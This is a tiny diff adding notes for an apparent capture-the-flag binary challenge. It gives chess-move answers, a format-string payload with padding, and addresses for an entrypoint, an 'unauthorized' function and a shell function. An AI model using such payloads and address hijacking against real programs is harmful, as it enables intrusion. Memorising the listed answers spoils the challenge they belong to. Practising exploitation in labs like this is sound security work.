@@ -1,0 +1,12 @@
+correct answers:
+Ra1
+Qg7
+Kd2
+
+payload:
+%sAAAAAAAAAAAAARa1 %p %p
+
+
+entrypoint; 4017c6
+unauthorized address: 4011f5
+shell address: 4011c2
